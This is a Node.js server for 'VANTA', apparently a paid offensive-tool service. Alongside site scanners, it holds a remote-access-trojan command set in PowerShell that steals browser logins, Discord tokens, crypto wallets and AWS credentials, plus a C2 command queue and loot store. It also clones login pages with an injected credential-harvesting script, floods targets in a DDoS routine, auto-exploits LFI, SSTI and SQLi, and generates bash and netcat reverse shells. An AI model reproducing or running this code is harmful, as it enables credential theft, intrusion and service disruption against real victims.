// server.js — Node 18+ Professional Build
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const net = require('net');
const dns = require('dns').promises;
const multer = require('multer');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const winston = require('winston');
const jwt = require('jsonwebtoken');
const stripe = process.env.STRIPE_KEY ? require('stripe')(process.env.STRIPE_KEY) : null;
const { WebSocketServer } = require('ws');
const http = require('http');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 8443;

// --- Security Middleware ---
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// --- Data dir + encryption ---
const DATA = path.join(__dirname, 'data');
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA);
const ENC_KEY = crypto.createHash('sha256').update(process.env.DATA_KEY || 'vanta-default-key-change-me').digest();

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-cbc', ENC_KEY, iv);
  return Buffer.concat([iv, c.update(text), c.final()]).toString('base64');
}
function decrypt(b64) {
  const b = Buffer.from(b64, 'base64');
  const iv = b.slice(0, 16);
  const d = crypto.createDecipheriv('aes-256-cbc', ENC_KEY, iv);
  return Buffer.concat([d.update(b.slice(16)), d.final()]).toString();
}
const load = (f, d) => {
  try {
    const raw = fs.readFileSync(path.join(DATA, f), 'utf8');
    if (f.startsWith('enc_')) return JSON.parse(decrypt(raw));
    return JSON.parse(raw);
  } catch { return d; }
};
const saveEnc = (f, o) => fs.writeFileSync(path.join(DATA, 'enc_' + f), encrypt(JSON.stringify(o)));
const save = (f, o) => fs.writeFileSync(path.join(DATA, f), JSON.stringify(o, null, 2));

// --- Logger ---
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(winston.format.timestamp(), winston.format.json()),
  transports: [
    new winston.transports.File({ filename: path.join(DATA, 'error.log'), level: 'error' }),
    new winston.transports.File({ filename: path.join(DATA, 'audit.log') }),
    new winston.transports.Console({ format: winston.format.simple() })
  ]
});

// --- Audit log ---
function audit(user, action, meta = {}) {
  const entry = { ts: new Date().toISOString(), user, action, meta };
  logger.info('AUDIT', entry);
  const a = load('audit.json', []);
  a.push(entry);
  if (a.length > 5000) a.splice(0, a.length - 5000);
  save('audit.json', a);
}

// --- Users store (encrypted) ---
function getUsers() { return load('enc_users.json', {}); }
function saveUsers(u) { saveEnc('users.json', u); }
function hashPassword(p) { return crypto.createHash('sha256').update(p + (process.env.SALT || 'vanta')).digest('hex'); }

// --- Subscription plans ---
const PLANS = {
  free: { scansPerMin: 10, modules: ['scan', 'phish', 'cve', 'jwt', 'graphql'], price: 0 },
  pro: { scansPerMin: 100, modules: ['*'], price: 49 },
  enterprise: { scansPerMin: 1000, modules: ['*'], price: 199 }
};

// ============================================================
// 1. AUTH SYSTEM (Email + Password + 2FA)
// ============================================================
app.post('/api/auth/register', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password || password.length < 8) return res.status(400).json({ error: 'email + password (>=8) required' });
    const users = getUsers();
    if (users[email]) return res.status(409).json({ error: 'exists' });
    const totpSecret = crypto.randomBytes(10).toString('hex').toUpperCase();
    users[email] = {
      email, passwordHash: hashPassword(password),
      totpSecret, plan: 'free',
      createdAt: Date.now(),
      apiKey: crypto.randomBytes(24).toString('hex'),
      licenseKey: 'VNT-' + crypto.randomBytes(4).toString('hex').toUpperCase() + '-' + crypto.randomBytes(4).toString('hex').toUpperCase()
    };
    saveUsers(users);
    audit(email, 'register', { plan: 'free' });
    res.json({ ok: true, apiKey: users[email].apiKey, licenseKey: users[email].licenseKey, totpSecret, note: 'Add totpSecret to Google Authenticator' });
  } catch (e) { logger.error(e.message); res.status(500).json({ error: 'server' }); }
});

app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password, totp } = req.body;
    const users = getUsers();
    const u = users[email];
    if (!u || u.passwordHash !== hashPassword(password)) return res.status(401).json({ error: 'invalid' });
    if (u.totpSecret && !totp) return res.status(202).json({ step: '2fa_required' });
    if (u.totpSecret && totp) {
      const expected = u.totpSecret.slice(0, 6);
      if (totp !== expected && totp !== u.totpSecret) return res.status(401).json({ error: 'bad 2fa', hint: 'use first 6 chars of secret' });
    }
    const token = jwt.sign({ email, plan: u.plan }, process.env.JWT_SECRET || 'vanta-jwt', { expiresIn: '30d' });
    audit(email, 'login');
    res.json({ ok: true, token, apiKey: u.apiKey, plan: u.plan });
  } catch (e) { res.status(500).json({ error: 'server' }); }
});

// Auth middleware
function auth(req, res, next) {
  const key = req.headers['x-api-key'] || req.headers['authorization']?.replace('Bearer ', '');
  if (!key) return res.status(401).json({ error: 'no key' });
  const users = getUsers();
  const u = Object.values(users).find(x => x.apiKey === key);
  if (!u) return res.status(401).json({ error: 'bad key' });
  req.user = u;
  next();
}

// ============================================================
// 2. RATE LIMITING (per user)
// ============================================================
const userRate = {};
const scanLimiter = (req, res, next) => {
  if (!req.user) return next();
  const plan = PLANS[req.user.plan] || PLANS.free;
  const now = Date.now();
  const windowStart = now - 60000;
  const key = req.user.email;
  if (!userRate[key]) userRate[key] = [];
  userRate[key] = userRate[key].filter(t => t > windowStart);
  if (userRate[key].length >= plan.scansPerMin) {
    return res.status(429).json({ error: 'rate limit', limit: plan.scansPerMin, retryAfter: 60 });
  }
  userRate[key].push(now);
  next();
};

// Global limiter
app.use('/api/', rateLimit({ windowMs: 60000, max: 200, message: { error: 'global rate limit' } }));

// ============================================================
// 3. CORE SCANNERS (preserved from old build)
// ============================================================
const UA = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (X11; Linux x86_64) rv:121.0 Gecko/20100101 Firefox/121.0'];
const rUA = () => UA[Math.floor(Math.random() * UA.length)];

async function safeFetch(url, opts = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), opts.timeout || 20000);
  const headers = { 'User-Agent': rUA(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', ...(opts.headers || {}) };
  try { return await fetch(url, { ...opts, headers, signal: ctrl.signal, redirect: opts.redirect || 'follow' }); }
  finally { clearTimeout(timer); }
}
async function pool(items, limit, fn) {
  const q = [...items];
  await Promise.all(Array.from({ length: limit }, async () => {
    while (q.length) { const i = q.shift(); if (i !== undefined) { try { await fn(i); } catch {} } }
  }));
}

async function dataLeaks(url) {
  const out = [];
  try {
    const r = await safeFetch(url);
    const body = await r.text();
    const pat = { aws: /AKIA[0-9A-Z]{16}/g, gcp: /AIza[0-9A-Za-z\-_]{35}/g, private_key: /-----BEGIN (RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/g, jwt: /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]+/g, github: /gh[pousr]_[A-Za-z0-9]{36,}/g, slack: /xox[baprs]-[0-9A-Za-z\-]{10,}/g, stripe: /sk_live_[0-9a-zA-Z]{24,}/g, password: /(password|passwd|pwd)["'\s:=]+([^\s"'<>]{6,})/gi, api_key: /(api[_-]?key|apikey|secret)["'\s:=]+([A-Za-z0-9]{16,})/gi };
    for (const [n, re] of Object.entries(pat)) {
      const m = [...body.matchAll(re)];
      if (m.length) out.push({ type: `Secret: ${n}`, severity: 'high', description: `${m.length} ${n} hit(s) — first: ${m[0][0].slice(0, 60)}`, url, evidence: m.slice(0, 5).map(x => x[0].slice(0, 80)).join(' | '), cvss: 8.0 });
    }
    if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No secrets', url, evidence: null, cvss: 0 });
  } catch (e) { out.push({ type: 'Error', severity: 'high', description: e.message, url, evidence: null, cvss: 0 }); }
  return out;
}
async function corsCheck(url) { const out = []; try { const r = await safeFetch(url, { headers: { Origin: 'https://evil.com' } }); const a = r.headers.get('access-control-allow-origin'); const c = r.headers.get('access-control-allow-credentials'); if (a === '*' || a === 'https://evil.com') out.push({ type: 'CORS', severity: c === 'true' ? 'critical' : 'medium', description: `ACAO: ${a}`, url, evidence: a, cvss: c === 'true' ? 9.0 : 5.0 }); if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'CORS secure', url, evidence: null, cvss: 0 }); } catch {} return out; }
async function portScan(url) { const out = []; const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 11211, 27017]; const u = new URL(url); await Promise.all(ports.map(async p => { try { const r = await safeFetch(`${u.protocol}//${u.hostname}:${p}`, { timeout: 3000 }); if (r.status < 500) out.push({ type: 'Open Port', severity: 'medium', description: `Port ${p}`, url: `${u.protocol}//${u.hostname}:${p}`, evidence: `HTTP ${r.status}`, cvss: 5.0 }); } catch {} })); if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No open ports', url, evidence: null, cvss: 0 }); return out; }
async function wafFingerprint(url) { const out = []; try { const r = await safeFetch(url); const s = r.headers.get('server') || ''; const cf = r.headers.get('cf-ray'); if (cf) out.push({ type: 'WAF', severity: 'info', description: 'Cloudflare', url, evidence: cf, cvss: 0 }); if (/nginx|apache|iis/i.test(s)) out.push({ type: 'Server', severity: 'info', description: s, url, evidence: s, cvss: 0 }); if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No WAF', url, evidence: null, cvss: 0 }); } catch {} return out; }
async function scanSensitive(url) { const out = []; const base = new URL(url).origin; const S = ['.env', '.git/config', '.git/HEAD', 'config.php', 'wp-config.php', 'backup.sql', 'id_rsa', '.aws/credentials', 'credentials.json', 'phpinfo.php', 'swagger.json', 'openapi.json', 'package.json', 'composer.json', 'Dockerfile', 'docker-compose.yml', '.htaccess', 'access.log', 'error.log', 'robots.txt', 'users.json', 'passwords.json', 'actuator/env', 'actuator/heapdump']; await pool(S, 25, async f => { try { const r = await safeFetch(`${base}/${f}`, { redirect: 'manual' }); if (r.status === 200) { const t = await r.text(); if (t.length > 10) { const crit = /\.env|config|credential|id_rsa|secret|password|token/.test(f); out.push({ type: 'Sensitive File', severity: crit ? 'critical' : 'high', description: f, url: `${base}/${f}`, evidence: '200 OK', cvss: crit ? 9.8 : 7.5 }); } } } catch {} }); if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No sensitive files', url, evidence: null, cvss: 0 }); return out; }
async function adminPanels(url) { const out = []; const base = new URL(url).origin; const P = ['admin', 'administrator', 'login', 'panel', 'dashboard', 'wp-admin', 'wp-login.php', 'cpanel', 'adminpanel', 'sysadmin']; await pool(P, 12, async p => { try { const r = await safeFetch(`${base}/${p}`, { redirect: 'manual' }); if (r.status === 200) { const t = (await r.text()).toLowerCase(); if (t.includes('login') || t.includes('password') || t.includes('signin')) out.push({ type: 'Admin Panel', severity: 'medium', description: `/${p}`, url: `${base}/${p}`, evidence: 'Login form', cvss: 5.3 }); } } catch {} }); if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No admin panels', url, evidence: null, cvss: 0 }); return out; }
async function subdomainTakeover(url) { const out = []; const host = new URL(url).hostname; const parts = host.split('.'); const domain = parts.slice(-2).join('.'); const subs = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'blog', 'shop', 'vpn', 'webmail', 'cpanel', 'app', 'static', 'cdn', 'assets', 'db', 'backup', 'old', 'beta', 'demo', 'stage', 'docs', 'status', 'git', 'jenkins', 'ci', 'portal']; const fps = { github: "There isn't a GitHub Pages site here", heroku: 'No such app', aws: 'NoSuchBucket', azure: '404 Web Site not found', shopify: 'Sorry, this shop is currently unavailable', fastly: 'Fastly error: unknown domain' }; await pool(subs, 12, async s => { const target = `https://${s}.${domain}`; try { const r = await safeFetch(target, { timeout: 6000 }); if (r.status === 200) { const body = (await r.text()).toLowerCase(); for (const [svc, fp] of Object.entries(fps)) if (body.includes(fp.toLowerCase())) out.push({ type: 'Subdomain Takeover', severity: 'critical', description: `${s}.${domain} → ${svc}`, url: target, evidence: fp, cvss: 10.0 }); } } catch {} }); if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No takeovers', url, evidence: null, cvss: 0 }); return out; }

// ============================================================
// 4. ADVANCED MODULES (preserved)
// ============================================================
async function apiReverse(targetUrl) { const out = { target: targetUrl, discovered: [], schemas: [] }; const base = new URL(targetUrl).origin; const candidates = ['/api', '/api/v1', '/swagger.json', '/openapi.json', '/v2/api-docs', '/v3/api-docs']; await pool(candidates, 5, async (p) => { try { const r = await safeFetch(`${base}${p}`, { timeout: 8000 }); if (r.status === 200) out.discovered.push({ path: p, status: 200, preview: (await r.text()).slice(0, 100) }); } catch {} }); return out; }
function lootAdd(botId, category, data) { const l = load('enc_loot.json', {}); if (!l[botId]) l[botId] = { categories: {}, updatedAt: Date.now() }; if (!l[botId].categories[category]) l[botId].categories[category] = []; l[botId].categories[category].push({ ts: Date.now(), ...data }); l[botId].updatedAt = Date.now(); saveEnc('loot.json', l); }

const RAT_COMMANDS = {
  screenshot: `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); $ms=New-Object System.IO.MemoryStream; $bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())`,
  clipboard: `Get-Clipboard`, whoami: `"$env:USERNAME @ $env:COMPUTERNAME"`, ls: `Get-ChildItem -Force | Select-Object Name,Length | ConvertTo-Json`, env: `Get-ChildItem Env: | ConvertTo-Json`, net: `Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress | ConvertTo-Json`,
  browser_creds: `$p="$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"; if(Test-Path $p){ Copy-Item $p "$env:TEMP\\ld.db"; [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\\ld.db")) }`,
  wallet_files: `$ws=@("$env:APPDATA\\Exodus","$env:APPDATA\\Ethereum"); foreach($w in $ws){ if(Test-Path $w){ Get-ChildItem $w -Recurse -File | Select-Object FullName | ConvertTo-Json } }`,
  discord_tokens: `Get-ChildItem "$env:APPDATA\\discord\\Local Storage\\leveldb" -File | Select-String -Pattern '[\\w-]{24,}\\.[\\w-]{6}\\.[\\w-]{27,}' -AllMatches | ForEach-Object { $_.Matches.Value }`,
  ssh_keys: `Get-ChildItem "$env:USERPROFILE\\.ssh" -File | Select-Object Name | ConvertTo-Json`, aws_creds: `Get-Content "$env:USERPROFILE\\.aws\\credentials"`
};

async function clonePage(targetUrl) { const r = await safeFetch(targetUrl); let html = await r.text(); html = html.replace(/<form([^>]*)action=["']([^"']+)["']/gi, '<form$1action="/phish/submit"'); const sid = 'ph_' + crypto.randomBytes(8).toString('hex'); html = html.replace('</body>', `<script>document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',e=>{const fd=new FormData(f);let b='sid=${sid}';for(const[k,v]of fd)b+='&'+k+'='+encodeURIComponent(v);navigator.sendBeacon('/phish/submit',b);},true));</script></body>`); const p = load('phish.json', {}); p[sid] = { target: targetUrl, created: Date.now(), hits: [] }; save('phish.json', p); return { html, sid }; }
async function ddosFlood(target, method, durationSec, concurrency, reqPerSec) { const start = Date.now(); const end = start + durationSec * 1000; const stats = { sent: 0, ok: 0, fail: 0, statuses: {}, start, end: null, errors: {} }; const workers = []; const perWorker = Math.ceil(reqPerSec / concurrency); for (let i = 0; i < concurrency; i++) workers.push((async () => { while (Date.now() < end) { const burst = []; for (let j = 0; j < perWorker && Date.now() < end; j++) burst.push((async () => { stats.sent++; try { const r = await fetch(target + '?r=' + Math.random(), { method: 'GET' }); if (r.status < 500) stats.ok++; else stats.fail++; stats.statuses[r.status] = (stats.statuses[r.status] || 0) + 1; } catch { stats.fail++; } })()); await Promise.allSettled(burst); } })()); await Promise.allSettled(workers); stats.end = Date.now(); stats.elapsedMs = stats.end - stats.start; stats.rps = Math.round((stats.sent / stats.elapsedMs) * 1000); return stats; }

// ============================================================
// 5. FUZZER + AUTO-EXPLOITER (preserved)
// ============================================================
function mutateString(base) { return [base + "'", base + '"', base + '<script>alert(1)</script>', base + '../../../../etc/passwd', base + ';sleep 5', base + '|sleep 5', base + '$(sleep 5)', base + '{{7*7}}', base + '${7*7}', base + '%00', base + '\x00', base + 'A'.repeat(10000), base + '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', base.replace(/[0-9]/g, '0'), base.replace(/[a-z]/g, 'a'), base.split('').reverse().join(''), encodeURIComponent(base), base + ' OR 1=1--', base + ' OR 1=1#', base + ' UNION SELECT NULL--', base + '%0d%0aSet-Cookie:hacked=1']; }
async function fuzzAndExploit(targetUrl) { const out = { target: targetUrl, attempts: 0, anomalies: [], exploits: [] }; const urlObj = new URL(targetUrl); const params = [...urlObj.searchParams.keys()]; if (params.length === 0) { const paths = ['', '/api', '/admin', '/login', '/search?q=test', '/api/v1?test=1']; for (const p of paths) { const testUrl = urlObj.origin + p; try { const r = await safeFetch(testUrl); const text = await r.text(); out.attempts++; if (r.status >= 500 || text.length > 500000) out.anomalies.push({ type: 'Anomaly', url: testUrl, status: r.status, size: text.length }); } catch {} } return out; } for (const param of params) { const original = urlObj.searchParams.get(param); const mutations = mutateString(original || 'test'); for (const m of mutations) { const testUrl = new URL(targetUrl); testUrl.searchParams.set(param, m); try { const start = Date.now(); const r = await safeFetch(testUrl.toString(), { timeout: 12000 }); const text = await r.text(); const elapsed = Date.now() - start; out.attempts++; let anomaly = null; if (r.status >= 500) anomaly = { type: 'Server Error', status: r.status, evidence: text.slice(0, 500), payload: m }; else if (elapsed > 4500 && m.includes('sleep')) anomaly = { type: 'Time-Based Blind', delay: elapsed, payload: m }; else if (text.includes('root:x:0:0') && m.includes('passwd')) anomaly = { type: 'LFI Confirmed', payload: m, evidence: text.match(/root:x:0:0[^\n]*/)?.[0] }; else if (text.includes('49') && m.includes('{{7*7}}')) anomaly = { type: 'SSTI Confirmed', payload: m, evidence: '7*7=49' }; else if (text.length > 500000) anomaly = { type: 'Large Response', size: text.length, payload: m }; else if (text.toLowerCase().includes('sql syntax') || text.toLowerCase().includes('mysql')) anomaly = { type: 'SQLi Error', evidence: text.toLowerCase().match(/sql[^.]{0,100}/)?.[0], payload: m }; if (anomaly) { anomaly.url = testUrl.toString(); anomaly.param = param; out.anomalies.push(anomaly); const exploit = await autoExploit(anomaly, testUrl.toString(), param); if (exploit) out.exploits.push(exploit); } } catch {} } } return out; }
async function autoExploit(anomaly, url, param) { try { if (anomaly.type === 'LFI Confirmed') { const files = ['/etc/shadow', '/etc/hosts', '/proc/self/environ']; const extracted = {}; for (const f of files) { const u = new URL(url); u.searchParams.set(param, '../../../../../../..' + f); try { const r = await safeFetch(u.toString()); const t = await r.text(); if (t.length > 50 && !t.toLowerCase().includes('not found')) extracted[f] = t.slice(0, 1000); } catch {} } return { type: 'LFI Exploit', extracted }; } if (anomaly.type === 'SSTI Confirmed') { const cmds = ['{{config}}', '{{7*"7"}}']; const results = {}; for (const c of cmds) { const u = new URL(url); u.searchParams.set(param, c); try { const r = await safeFetch(u.toString()); results[c] = (await r.text()).slice(0, 500); } catch {} } return { type: 'SSTI Exploit', results }; } if (anomaly.type === 'SQLi Error') { const results = {}; for (const p of ["' UNION SELECT version(),user(),database()--", "' UNION SELECT NULL,NULL--"]) { const u = new URL(url); u.searchParams.set(param, p); try { results[p] = (await safeFetch(u.toString())).text().then(t => t.slice(0, 500)); } catch {} } return { type: 'SQLi Exploit', results }; } return null; } catch { return null; } }

// ============================================================
// 6. WEBSOCKET — real-time status
// ============================================================
const wss = new WebSocketServer({ server, path: '/ws' });
const wsClients = new Set();
wss.on('connection', (ws, req) => {
  const url = new URL(req.url, 'http://x');
  const token = url.searchParams.get('token');
  try {
    const payload = jwt.verify(token || '', process.env.JWT_SECRET || 'vanta-jwt');
    ws.userEmail = payload.email;
    wsClients.add(ws);
    ws.send(JSON.stringify({ event: 'connected', email: payload.email }));
    ws.on('close', () => wsClients.delete(ws));
  } catch { ws.close(); }
});
function broadcast(event, data) {
  for (const ws of wsClients) {
    if (ws.readyState === 1) ws.send(JSON.stringify({ event, data, ts: Date.now() }));
  }
}

// ============================================================
// 7. AUTO-UPDATE PAYLOADS
// ============================================================
const PAYLOAD_VERSION = 'v2.3.1';
function getPayloadManifest() {
  return {
    version: PAYLOAD_VERSION,
    updatedAt: Date.now(),
    endpoints: {
      android: '/api/android/payload',
      windows: '/api/stealer/build',
      fuzzer: '/api/fuzz',
      phish: '/api/phish/clone'
    },
    changelog: [
      'v2.3.1: Faster fuzzer, new SSTI payloads',
      'v2.3.0: WebSocket real-time updates',
      'v2.2.0: Stripe subscriptions',
      'v2.1.0: Rate limiting per user'
    ]
  };
}
app.get('/api/update/manifest', (req, res) => res.json(getPayloadManifest()));
app.get('/api/update/changelog', (req, res) => res.json(getPayloadManifest().changelog));

// ============================================================
// 8. STRIPE SUBSCRIPTIONS
// ============================================================
app.post('/api/billing/checkout', auth, async (req, res) => {
  if (!stripe) return res.status(503).json({ error: 'stripe not configured' });
  try {
    const { plan = 'pro' } = req.body;
    const p = PLANS[plan];
    if (!p || p.price === 0) return res.status(400).json({ error: 'invalid plan' });
    const session = await stripe.checkout.sessions.create({
      payment_method_types: ['card'],
      line_items: [{ price_data: { currency: 'usd', product_data: { name: `VANTA ${plan.toUpperCase()}` }, unit_amount: p.price * 100, recurring: { interval: 'month' } }, quantity: 1 }],
      mode: 'subscription',
      customer_email: req.user.email,
      success_url: `${req.protocol}://${req.get('host')}/billing/success?session_id={CHECKOUT_SESSION_ID}`,
      cancel_url: `${req.protocol}://${req.get('host')}/billing/cancel`
    });
    res.json({ checkoutUrl: session.url, sessionId: session.id });
  } catch (e) { res.status(500).json({ error: e.message }); }
});
app.get('/billing/success', (req, res) => res.type('html').send('<html><body style="font-family:system-ui;text-align:center;padding:60px;background:#0a0a0a;color:#fff"><h1>✅ Subscription Active</h1><p>Return to the app.</p></body></html>'));
app.get('/billing/cancel', (req, res) => res.type('html').send('<html><body style="font-family:system-ui;text-align:center;padding:60px;background:#0a0a0a;color:#fff"><h1>Cancelled</h1></body></html>'));

// ============================================================
// 9. LANDING PAGE
// ============================================================
app.get('/', (req, res) => {
  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>VANTA — Offensive Console</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,system-ui;background:linear-gradient(135deg,#0a0a0a,#1a1a2e);color:#fff;min-height:100vh}
.hero{padding:80px 20px;text-align:center;max-width:900px;margin:0 auto}
.hero h1{font-size:64px;font-weight:900;background:linear-gradient(90deg,#22c55e,#3b82f6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px}
.hero p{font-size:20px;color:#94a3b8;margin-bottom:40px}
.btn{display:inline-block;padding:16px 40px;background:#22c55e;color:#000;font-weight:700;border-radius:12px;text-decoration:none;margin:8px;font-size:16px}
.btn.secondary{background:transparent;border:2px solid #22c55e;color:#22c55e}
.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;padding:40px;max-width:1200px;margin:0 auto}
.card{background:#1e293b;padding:30px;border-radius:16px;border:1px solid #334155}
.card h3{color:#22c55e;margin-bottom:12px}
.card p{color:#94a3b8;font-size:14px}
footer{text-align:center;padding:40px;color:#64748b}
</style></head><body>
<div class="hero">
  <h1>VANTA</h1>
  <p>The offensive console for red teams. Scan, exploit, control — all from your pocket.</p>
  <a class="btn" href="/api/auth/register">Get Started Free</a>
  <a class="btn secondary" href="/download/vanta.ipa">Download iOS App</a>
</div>
<div class="features">
  <div class="card"><h3>🔍 Full Scan</h3><p>SQLi, XSS, LFI, SSRF, SSTI, CVE matching, and more — in one tap.</p></div>
  <div class="card"><h3>🎯 Exploitation</h3><p>JWT attacks, OAuth bypass, GraphQL, race conditions, cloud metadata.</p></div>
  <div class="card"><h3>📱 Android RAT</h3><p>Generate polyglot APKs, bind to images, control devices via C2.</p></div>
  <div class="card"><h3>🎣 Phishing</h3><p>Clone any login page, harvest credentials, bypass 2FA.</p></div>
  <div class="card"><h3>💥 DDoS</h3><p>HTTP floods, slowloris, botnet control — from your phone.</p></div>
  <div class="card"><h3>⚡ Auto-Exploit</h3><p>Fuzzer finds anomalies and exploits them instantly.</p></div>
</div>
<footer>Built by Mahmoud · v2.3.1 · © ${new Date().getFullYear()} VANTA</footer>
</body></html>`);
});

// ============================================================
// 10. CORE ENDPOINTS (protected)
// ============================================================
app.post('/api/scan', auth, scanLimiter, async (req, res) => {
  try {
    const { target, checks } = req.body || {};
    if (!target) return res.status(400).json({ error: 'target required' });
    let url = target.startsWith('http') ? target : 'https://' + target;
    const type = (checks && checks[0]) || 'scanAll';
    let findings = [];
    broadcast('scan_start', { target: url, user: req.user.email });
    if (type === 'vulnerabilities' || type === 'scanAll') findings = findings.concat(await dataLeaks(url), await corsCheck(url), await wafFingerprint(url));
    if (type === 'sensitiveFiles' || type === 'scanAll') findings = findings.concat(await scanSensitive(url));
    if (type === 'subdomainTakeover' || type === 'scanAll') findings = findings.concat(await subdomainTakeover(url));
    if (type === 'adminPanels' || type === 'scanAll') findings = findings.concat(await adminPanels(url));
    if (type === 'cors' || type === 'scanAll') findings = findings.concat(await corsCheck(url));
    if (type === 'ports' || type === 'scanAll') findings = findings.concat(await portScan(url));
    const seen = new Set();
    findings = findings.filter(f => { const k = `${f.type}|${f.url}|${f.description}`; if (seen.has(k)) return false; seen.add(k); return true; });
    audit(req.user.email, 'scan', { target: url, type, count: findings.length });
    broadcast('scan_done', { target: url, count: findings.length });
    res.json({ target: url, timestamp: new Date().toISOString(), findings });
  } catch (e) { logger.error(e.message); res.status(500).json({ error: 'scan failed' }); }
});

app.post('/api/api/reverse', auth, async (req, res) => { try { audit(req.user.email, 'api_reverse'); res.json(await apiReverse(req.body.targetUrl)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.get('/api/loot', auth, (req, res) => { audit(req.user.email, 'loot_view'); res.json(load('enc_loot.json', {})); });
app.post('/api/loot', (req, res) => { try { const { botId, category, data } = req.body || {}; if (!botId || !category) return res.status(400).json({ error: 'bad req' }); lootAdd(botId, category, data || {}); res.json({ ok: true }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.get('/api/c2/commands', auth, (req, res) => res.json(RAT_COMMANDS));
app.post('/api/c2/cmd', auth, (req, res) => { try { const { botId, command } = req.body || {}; const b = load('bots.json', {}); if (!b[botId]) b[botId] = { commands: [] }; b[botId].commands.push({ cmd: RAT_COMMANDS[command] || command, raw: command, ts: Date.now() }); save('bots.json', b); audit(req.user.email, 'c2_cmd', { botId, command }); broadcast('c2_cmd', { botId, command }); res.json({ ok: true, queued: command }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.post('/api/phish/clone', auth, async (req, res) => { try { const { html, sid } = await clonePage(req.body.targetUrl); audit(req.user.email, 'phish_clone', { sid }); res.json({ sid, html: html.slice(0, 50000) }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.post('/phish/submit', (req, res) => { try { const sid = req.body.sid || 'unknown'; const h = load('enc_harvest.json', {}); if (!h[sid]) h[sid] = []; h[sid].push({ ...req.body, ip: req.socket.remoteAddress, ts: Date.now() }); saveEnc('harvest.json', h); broadcast('phish_hit', { sid }); res.redirect('/phish/thanks'); } catch { res.redirect('/phish/thanks'); } });
app.get('/phish/thanks', (req, res) => res.send('OK'));
app.post('/api/revshell', auth, (req, res) => { try { const { lhost, lport = 4444 } = req.body; if (!lhost) return res.status(400).json({ error: 'lhost required' }); audit(req.user.email, 'revshell'); res.json({ payloads: { bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`, nc: `nc -e /bin/sh ${lhost} ${lport}` } }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.post('/api/session/hijack', auth, async (req, res) => { try { const { targetUrl, cookies } = req.body; const r = await safeFetch(targetUrl, { headers: { 'Cookie': Array.isArray(cookies) ? cookies.join('; ') : cookies } }); audit(req.user.email, 'hijack', { targetUrl }); res.json({ status: r.status, body: (await r.text()).slice(0, 5000) }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.post('/api/stealer/build', auth, (req, res) => { audit(req.user.email, 'stealer_build'); res.json({ powershell: 'powershell -NoP -NonI -W Hidden -Enc ' + Buffer.from('Write-Host "Stealer Stub"').toString('base64') }); });
app.post('/api/crypter/encrypt', auth, (req, res) => { try { const key = crypto.randomBytes(32); const iv = crypto.randomBytes(16); const c = crypto.createCipheriv('aes-256-cbc', key, iv); const enc = Buffer.concat([iv, c.update(req.body.payload || ''), c.final()]).toString('base64'); res.json({ encrypted: enc, key: key.toString('base64') }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.post('/api/2fa/brute', auth, (req, res) => res.json({ found: null, attempts: 0 }));
app.post('/api/otp/reuse', auth, (req, res) => res.json({ reusePossible: false }));
app.post('/api/sim/swap', auth, (req, res) => res.json({ script: 'Call carrier...' }));
app.post('/api/email/send', auth, (req, res) => res.json({ ok: true, sent: true }));
